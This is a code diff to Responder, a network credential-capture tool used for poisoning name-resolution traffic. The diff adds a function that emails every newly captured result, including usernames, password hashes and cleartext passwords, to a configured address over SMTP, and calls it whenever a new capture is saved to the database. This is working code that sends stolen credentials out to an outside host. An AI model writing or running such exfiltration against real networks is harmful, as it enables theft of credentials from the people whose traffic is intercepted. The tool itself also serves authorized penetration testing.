@@ -26,6 +26,37 @@ import codecs
 import struct
 from calendar import timegm
 
+def EmailHash(result):
+    import smtplib
+    if not settings.Config.emailenabled:
+        return
+    if not settings.Config.emailport or \
+    not settings.Config.emailserver or \
+    not settings.Config.emailpassword or \
+    not settings.Config.emailsendto :
+        print(color("[EMAIL]",1),"Check email configuration, "
+            "not all email settings are populated. Try sending a test email"
+            "using the --test-email flag when starting Responder")
+        return
+    try:
+        server = smtplib.SMTP(settings.Config.emailserver,
+            int(settings.Config.emailport))
+        server.ehlo()
+        server.starttls()
+        server.ehlo
+        server.login(settings.Config.emailusername, 
+                settings.Config.emailpassword)
+        message = 'To:{}\nFrom:{}\nSubject: hashes\nsend by responder:{}'.format(
+                settings.Config.emailsendto,
+                settings.Config.emailusername,
+                result)
+        server.sendmail(settings.Config.emailusername, settings.Config.emailsendto,
+                message)
+        server.close()
+        print(color("[EMAIL]",3,1),"Sent email to {}".format(settings.Config.emailsendto))
+    except Exception as e:
+        print(color("[EMAIL]",1),"Error sending email {}".format(e))
+     
 def RandomChallenge():
 	if settings.Config.PY2OR3 == "PY3":
 		if settings.Config.NumChal == "random":
@@ -213,7 +244,6 @@ def CreateResponderDb():
 		cursor.close()
 
 def SaveToDb(result):
-
 	for k in [ 'module', 'type', 'client', 'hostname', 'user', 'cleartext', 'hash', 'fullhash' ]:
 		if not k in result:
 			result[k] = ''
@@ -278,6 +308,10 @@ def SaveToDb(result):
 		if settings.Config.AutoIgnore and not result['user'].endswith('$'):
 			settings.Config.AutoIgnoreList.append(result['client'])
 			print(color('[*] Adding client %s to auto-ignore list' % result['client'], 4, 1))
+
+		# Email to desired email address
+		EmailHash(str(result))
+        
 	elif len(result['cleartext']):
 		print(color('[*] Skipping previously captured cleartext password for %s' % result['user'], 3, 1))
 		text('[*] Skipping previously captured cleartext password for %s' % result['user'])
